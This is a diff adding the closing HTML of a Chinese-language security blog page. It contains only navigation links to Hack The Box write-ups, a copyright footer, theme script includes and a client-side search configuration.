+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2019/08/hacktheboxdevel/" class="prev" rel="prev" title="Hack The Box —— Devel"><i class="fas fa-angle-left fa-fw"></i>Hack The Box —— Devel</a>
+            <a href="/2019/09/hacktheboxtenten/" class="next" rel="next" title="Hack The Box —— Tenten">Hack The Box —— Tenten<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
